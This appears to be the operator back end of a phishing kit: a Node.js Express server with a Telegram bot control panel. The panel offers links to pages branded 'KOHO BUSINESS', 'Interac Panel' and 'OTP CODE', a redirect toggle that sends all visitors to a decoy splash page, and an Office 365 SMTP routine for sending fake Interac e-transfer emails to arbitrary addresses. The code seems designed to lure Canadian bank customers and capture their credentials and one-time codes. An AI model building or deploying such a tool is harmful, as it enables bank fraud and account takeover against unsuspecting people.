#!/usr/bin/env node
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import express from "express";
import { exec } from "child_process";
import nodemailer from "nodemailer";
import TelegramBot from "node-telegram-bot-api";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// ───────────── CONFIG ─────────────
const BASE = __dirname;
const DOT_WWW = path.join(BASE, ".www");
const WWW = path.join(BASE, "www");
const LOGS = path.join(BASE, ".logs");
const DATA = path.join(BASE, ".data");
const WATCHERS_FILE = path.join(DATA, "watchers.json");
const CONFIG_FILE = path.join(DOT_WWW, "config/config.json");

const BOT_TOKEN = process.env.BOT_TOKEN;
const PUBLIC_URL = process.env.RENDER_EXTERNAL_URL;

if (!BOT_TOKEN) throw "❌ BOT_TOKEN missing";
if (!PUBLIC_URL) throw "❌ RENDER_EXTERNAL_URL missing";

if (!fs.existsSync(LOGS)) fs.mkdirSync(LOGS, { recursive: true });
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA, { recursive: true });
if (!fs.existsSync(path.dirname(CONFIG_FILE))) fs.mkdirSync(path.dirname(CONFIG_FILE), { recursive: true });

// ───────────── STATE ─────────────
const S = {
  watchers: new Set(),
  started: Date.now(),
  masterRedirect: false,
};

// ───────────── LOAD / SAVE WATCHERS ─────────────
function loadWatchers() {
  if (fs.existsSync(WATCHERS_FILE)) {
    try {
      S.watchers = new Set(JSON.parse(fs.readFileSync(WATCHERS_FILE)));
    } catch { S.watchers = new Set(); }
  }
}

function saveWatchers() {
  fs.writeFileSync(WATCHERS_FILE, JSON.stringify([...S.watchers]));
}

// ───────────── LOG ─────────────
function log(msg) {
  const line = `[${new Date().toISOString()}] ${msg}`;
  console.log(line);
  fs.appendFileSync(path.join(LOGS, "debug.log"), line + "\n");
}

// ───────────── EXPRESS SERVER ─────────────
if (!fs.existsSync(DOT_WWW)) fs.mkdirSync(DOT_WWW, { recursive: true });
if (!fs.existsSync(WWW)) fs.mkdirSync(WWW, { recursive: true });

const app = express();

// Simple static copy from .www to www
fs.cpSync(DOT_WWW, WWW, { recursive: true });

// Master redirect toggle
app.use((req, res, next) => {
  if (S.masterRedirect) return res.redirect(PUBLIC_URL + "/splash.php");
  next();
});

app.use(express.static(WWW));

app.get("/splash.php", (req, res) => {
  res.send("<h1>Koho Web App</h1>");
});

// ───────────── TELEGRAM BOT ─────────────
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const mainKB = {
  keyboard: [
    ["▶️ START", "📎 LINKS MENU", "⏹ STOP"],
    ["📊 STATUS", "👁 TOGGLE REDIRECT", "📝 LOGS"],
    ["❓ HELP", "⚠️ DISCLAIMER", "⚙️ SETTINGS"]
  ],
  resize_keyboard: true
};

const linksPanel = {
  inline_keyboard: [
    [{ text: "KOHO BUSINESS", url: PUBLIC_URL + "/splash.php?src=sarah" }],
    [{ text: "Interac Panel", url: PUBLIC_URL + "/blacklist.php?src=sarah" }],
    [{ text: "OTP CODE", url: PUBLIC_URL + "/otp.php?src=sarah" }]
  ]
};

const INTRO = `Hi, I’m Sarah — welcome to PROJECT-SARAH.
Hosted on Render. Master redirect is toggleable.
Tap ▶️ START to initialize.`;

const HELP = `
▶️ START - prepare site
📎 LINKS MENU - show links
📊 STATUS - check health
👁 TOGGLE REDIRECT - enable/disable master redirect
`;

// ───────────── BOT HANDLERS ─────────────
bot.onText(/\/start/, (msg) => {
  S.watchers.add(msg.chat.id);
  saveWatchers();
  bot.sendMessage(msg.chat.id, INTRO, { reply_markup: mainKB });
});

bot.on("message", async (msg) => {
  const text = (msg.text || "").toUpperCase();
  const cid = msg.chat.id;
  S.watchers.add(cid); saveWatchers();

  if (text.includes("START")) {
    await bot.sendMessage(cid, "Initializing site...", { reply_markup: mainKB });
    fs.cpSync(DOT_WWW, WWW, { recursive: true });
    return bot.sendMessage(cid, "Links ready!", { reply_markup: linksPanel });
  }

  if (text.includes("LINK")) {
    return bot.sendMessage(cid, "Quick links:", { reply_markup: linksPanel });
  }

  if (text.includes("STATUS")) {
    const uptime = Math.floor((Date.now() - S.started) / 1000);
    return bot.sendMessage(cid, `Uptime: ${uptime}s\nMaster redirect: ${S.masterRedirect}`, { reply_markup: mainKB });
  }

  if (text.includes("TOGGLE REDIRECT")) {
    S.masterRedirect = !S.masterRedirect;
    return bot.sendMessage(cid, `Master redirect ${S.masterRedirect ? "enabled" : "disabled"}`, { reply_markup: mainKB });
  }

  if (text.includes("LOG")) {
    const data = fs.existsSync(path.join(LOGS, "debug.log"))
      ? fs.readFileSync(path.join(LOGS, "debug.log"), "utf8").slice(-1800)
      : "No logs";
    return bot.sendMessage(cid, data);
  }

  if (text.includes("HELP")) {
    return bot.sendMessage(cid, HELP, { reply_markup: mainKB });
  }

  bot.sendMessage(cid, "Try START or STATUS", { reply_markup: mainKB });
});

// ───────────── EMAIL (Office 365 SMTP) ─────────────
const mailConfig = JSON.parse(fs.existsSync(CONFIG_FILE) ? fs.readFileSync(CONFIG_FILE) : '{}');

const transporter = nodemailer.createTransport({
  host: mailConfig.host || "smtp.office365.com",
  port: 587,
  secure: false,
  auth: {
    user: mailConfig.user || "",
    pass: mailConfig.pass || ""
  }
});

async function sendETRANSFERMail(to, subject, body) {
  if (!transporter) return log("SMTP not configured");
  try {
    await transporter.sendMail({ from: mailConfig.user, to, subject, html: body });
    log(`Sent e-transfer to ${to}`);
  } catch (err) {
    log(`Mail error: ${err}`);
  }
}

// ───────────── START SERVER ─────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => log(`Web online @ ${PORT}`));

loadWatchers();
log("Bot & web server online – Render master edition");